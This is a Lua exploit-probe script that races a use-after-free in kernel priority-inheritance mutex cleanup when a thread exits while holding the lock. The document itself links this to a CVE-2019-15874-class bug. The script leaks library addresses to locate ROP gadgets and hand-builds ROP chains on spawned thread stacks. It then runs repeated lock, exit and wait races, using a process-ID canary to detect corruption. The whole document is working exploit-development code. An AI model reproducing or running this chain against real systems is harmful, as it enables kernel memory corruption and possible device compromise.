-- CRASH_CLASS: HIGH
-- PROBE 99c: PI-mutex exit-while-holding race
--
-- CVE-2019-15874 class: umtx_pi UAF when thread exits holding PI mutex.
-- Key difference from 95b: holder does LOCK→thr_exit(431) WITHOUT unlock.
-- Kernel must handle dead-owner cleanup while waiters are blocked on the lock.
-- The race: umtx_pi_exit() frees the PI node while a waiter's umtx_pi_lookup()
-- still references it.
--
-- Also tests: does the kernel even clean up PI mutexes on thread exit?
-- (98a found kernel does NOT clean up RW locks on thread exit.)

print("=== PROBE 99c: PI EXIT-WHILE-HOLDING RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)
local sc_umtx=mk(454)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
print("gadgets OK")

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

local MAX_CH=80
local STK_PG=2
local PG_PER_CHILD=STK_PG+1
local TOTAL_PG=2+MAX_CH*PG_PER_CHILD
print(string.format("ch=%d pg=%d", MAX_CH, TOTAL_PG))

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print(string.format("region=0x%X",R))

-- Timespecs
local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl2=R+0x20; wq(sl2,uint64(0)); wq(sl2+8,uint64(2000000))
local sl5=R+0x40; wq(sl5,uint64(0)); wq(sl5+8,uint64(5000000))
local sl20=R+0x60; wq(sl20,uint64(0)); wq(sl20+8,uint64(20000000))
local tb=R+0xA0

-- PI mutexes — one per round to avoid stale state
local PI_BASE=R+0x200

local cidx=0
local function child_stk(i) return R+0x4000*(2+i*PG_PER_CHILD) end
local function child_ctx(i) return R+0x4000*(2+i*PG_PER_CHILD+STK_PG) end

-- Spawn a "holder" child: LOCK pi_mtx → nanosleep(2ms) → thr_exit(431)
local function spawn_holder(mtx_addr, exit_state)
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local off=0

    -- After initial syscall (LOCK), chain: sleep 2ms, then thr_exit
    -- nanosleep(240): RDI=ts, RSI=0
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(sl2)); off=off+8
    wq(stk+off,PRSI); off=off+8
    wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    -- thr_exit(431): RDI=exit_state
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(exit_state)); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(431)); off=off+8
    wq(stk+off,SA); off=off+8

    -- Safety tail: nanosleep(999s) in case thr_exit fails somehow
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(ts999)); off=off+8
    wq(stk+off,PRSI); off=off+8
    wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(454))
    wq(ctx+_DI,uint64(mtx_addr))
    wq(ctx+_SI,uint64(5))    -- MUTEX_LOCK
    wq(ctx+_DX,uint64(0))
    wq(ctx+_R10,uint64(0))
    wq(ctx+_R8,uint64(0))

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

-- Spawn a "waiter" child: LOCK→UNLOCK loops on PI mutex → nanosleep
local function spawn_waiter(mtx_addr)
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local stk_bytes=STK_PG*0x4000

    local off=0
    local ncycles=math.floor((stk_bytes-200)/80)
    for i=1,ncycles do
        wq(stk+off,PRSI); off=off+8
        wq(stk+off,uint64(6)); off=off+8     -- UNLOCK
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(454)); off=off+8
        wq(stk+off,SA); off=off+8
        wq(stk+off,PRSI); off=off+8
        wq(stk+off,uint64(5)); off=off+8     -- LOCK
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(454)); off=off+8
        wq(stk+off,SA); off=off+8
    end
    -- Final unlock
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(6)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
    wq(stk+off,SA); off=off+8
    -- nanosleep tail
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts999)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(454))
    wq(ctx+_DI,uint64(mtx_addr))
    wq(ctx+_SI,uint64(5))    -- MUTEX_LOCK
    wq(ctx+_DX,uint64(0))
    wq(ctx+_R10,uint64(0))
    wq(ctx+_R8,uint64(0))

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

-- ============================================================
print("--- A: GATE — verify PI lock + thr_exit ---")
-- ============================================================

local pi_gate=PI_BASE
z(pi_gate, 0x20)
wd(pi_gate, 0); wd(pi_gate+4, 4)  -- PRIO_INHERIT

local v0=vmc()
local ok_lk,rv_lk=pcall(function()
    return sc_umtx(uint64(pi_gate),uint64(5),uint64(0),uint64(0),uint64(0))
end)
local v1=vmc()
print(string.format("PI LOCK: rv=%s owner=0x%X vmd=%d",
    ok_lk and tostring(N(rv_lk)) or "FAIL", rd(pi_gate) or 0, v1-v0))

pcall(function()
    sc_umtx(uint64(pi_gate),uint64(6),uint64(0),uint64(0),uint64(0))
end)

if not ok_lk or N(rv_lk)~=0 then
    print("PI LOCK BROKEN — abort")
    return
end

-- Quick thr_exit gate: spawn a child that just writes and exits
local exit_st=R+0x180
wq(exit_st,uint64(0))
local gate_mtx=PI_BASE+0x40
z(gate_mtx,0x20)
wd(gate_mtx,0); wd(gate_mtx+4,4)

local tid_gate=spawn_holder(gate_mtx, exit_st)
native.fcall_with_rax(stub,240,sl5,0)  -- wait 5ms
local exit_val=rd(exit_st) or 0
local gate_owner=rd(gate_mtx) or 0
print(string.format("thr_exit gate: tid=%s exit_state=%d owner_after=0x%X",
    tostring(tid_gate), exit_val, gate_owner))

if exit_val==1 then
    print("thr_exit WORKS — holder died cleanly")
    if gate_owner==0 then
        print("  mutex RELEASED on exit — kernel cleans PI locks!")
    else
        print(string.format("  mutex STUCK at owner=0x%X — kernel does NOT clean PI!", gate_owner))
    end
else
    print("thr_exit may not have run (exit_state="..exit_val..")")
end
print("gate OK")

-- ============================================================
print("")
print("--- B: EXIT-WHILE-HOLDING RACE ---")
-- Holder: LOCK→sleep(2ms)→thr_exit
-- 4 waiters: LOCK→UNLOCK loops (block on holder's lock, race cleanup)
-- ============================================================

local hits_b=0
local stuck_b=0
local ROUNDS_B=10

for round=1,ROUNDS_B do
    if cidx>=MAX_CH-5 then print("B: LIMIT at ch="..cidx) break end

    local pi=PI_BASE+0x80+round*0x40
    z(pi, 0x20)
    wd(pi, 0); wd(pi+4, 4)

    local es=R+0x100+round*8
    wq(es,uint64(0))

    local vm_before=vmc()

    -- Spawn holder (locks, sleeps 2ms, exits)
    local htid=spawn_holder(pi, es)

    -- Spawn 4 waiters immediately (they'll block on the lock)
    for i=1,4 do spawn_waiter(pi) end

    -- Wait 20ms for holder to exit and waiters to race
    native.fcall_with_rax(stub,240,sl20,0)

    local vm_after=vmc()
    local m_owner=rd(pi) or 0
    local es_val=rd(es) or 0
    local canary=N(native.fcall_with_rax(stub,20))

    local tag=""
    if canary~=pid then hits_b=hits_b+1; tag=" !!CANARY" end
    if m_owner~=0 then
        stuck_b=stuck_b+1
        tag=tag..string.format(" STUCK=0x%X", m_owner)
    end
    if es_val~=1 then tag=tag.." EXIT_MISS" end

    print(string.format("B%d: canary=%d vmd=%d owner=0x%X exit=%d ch=%d%s",
        round, canary, vm_after-vm_before, m_owner, es_val, cidx, tag))
end
print(string.format("B: hits=%d stuck=%d", hits_b, stuck_b))

-- ============================================================
print("")
print("--- C: MUTEX_WAIT(17) ON DEAD OWNER ---")
-- After holder exits, main thread tries MUTEX_WAIT(op17)
-- Should return EOWNERDEAD (130) if kernel detects dead holder
-- ============================================================

if cidx<MAX_CH-2 then
    local pi_c=PI_BASE+0x80+(ROUNDS_B+1)*0x40
    z(pi_c, 0x20)
    wd(pi_c, 0); wd(pi_c+4, 4)

    local es_c=R+0x100+(ROUNDS_B+1)*8
    wq(es_c,uint64(0))

    -- Holder locks and exits
    spawn_holder(pi_c, es_c)
    native.fcall_with_rax(stub,240,sl5,0)  -- wait 5ms

    local owner_c=rd(pi_c) or 0
    local es_c_val=rd(es_c) or 0
    print(string.format("C: holder exit=%d owner=0x%X", es_c_val, owner_c))

    if owner_c~=0 then
        -- Mutex is stuck — try MUTEX_WAIT(17) for EOWNERDEAD
        local v_c1=vmc()
        local ok_mw,rv_mw=pcall(function()
            return sc_umtx(uint64(pi_c),uint64(17),uint64(0),uint64(0),uint64(0))
        end)
        local v_c2=vmc()
        print(string.format("C: MUTEX_WAIT(17) on dead owner: rv=%s vmd=%d",
            ok_mw and tostring(N(rv_mw)) or "FAIL", v_c2-v_c1))

        local owner_after=rd(pi_c) or 0
        print(string.format("C: owner after MUTEX_WAIT: 0x%X", owner_after))

        -- Cleanup
        if owner_after~=0 then
            wd(pi_c, 0)
            pcall(function()
                sc_umtx(uint64(pi_c),uint64(6),uint64(0),uint64(0),uint64(0))
            end)
        end
    else
        print("C: mutex was cleaned — trying LOCK to verify")
        local ok_cl,rv_cl=pcall(function()
            return sc_umtx(uint64(pi_c),uint64(5),uint64(0),uint64(0),uint64(0))
        end)
        print(string.format("C: LOCK after cleanup: rv=%s owner=0x%X",
            ok_cl and tostring(N(rv_cl)) or "FAIL", rd(pi_c) or 0))
        pcall(function()
            sc_umtx(uint64(pi_c),uint64(6),uint64(0),uint64(0),uint64(0))
        end)
    end
end

-- ============================================================
print("")
print("--- D: RAPID-FIRE EXIT RACE (no sleep) ---")
-- All children: LOCK→thr_exit (no nanosleep between)
-- Maximum race pressure on umtx_pi cleanup
-- ============================================================

local function spawn_instant_exit(mtx_addr, exit_state)
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local off=0

    -- After LOCK, immediately thr_exit
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(exit_state)); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(431)); off=off+8
    wq(stk+off,SA); off=off+8
    -- Safety tail
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts999)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(454))
    wq(ctx+_DI,uint64(mtx_addr))
    wq(ctx+_SI,uint64(5))
    wq(ctx+_DX,uint64(0))
    wq(ctx+_R10,uint64(0))
    wq(ctx+_R8,uint64(0))

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

local hits_d=0
local remaining=MAX_CH-cidx
local d_per_round=4
local d_rounds=math.floor(remaining/d_per_round)
if d_rounds>5 then d_rounds=5 end

for round=1,d_rounds do
    if cidx>=MAX_CH-d_per_round then break end

    local pi_d=PI_BASE+0x80+(ROUNDS_B+2+round)*0x40
    z(pi_d, 0x20)
    wd(pi_d, 0); wd(pi_d+4, 4)

    local es_base=R+0x100+(ROUNDS_B+2+round)*8

    local vm_before=vmc()

    -- Spawn N children that all LOCK→exit on same mutex
    for i=1,d_per_round do
        local es_i=es_base  -- shared exit state
        spawn_instant_exit(pi_d, es_i)
    end

    -- Wait for all to settle
    native.fcall_with_rax(stub,240,sl20,0)

    local vm_after=vmc()
    local m_owner=rd(pi_d) or 0
    local canary=N(native.fcall_with_rax(stub,20))

    local tag=""
    if canary~=pid then hits_d=hits_d+1; tag=" !!CANARY" end
    if m_owner~=0 then tag=tag..string.format(" STUCK=0x%X",m_owner) end

    print(string.format("D%d: canary=%d vmd=%d owner=0x%X ch=%d%s",
        round, canary, vm_after-vm_before, m_owner, cidx, tag))
end
print("D: hits="..hits_d)

-- ============================================================
print("")
print(string.format("SUMMARY: B_hits=%d B_stuck=%d D_hits=%d ch=%d",
    hits_b, stuck_b, hits_d, cidx))
print("final_canary="..N(native.fcall_with_rax(stub,20)))
print("=== 99c COMPLETE ===")
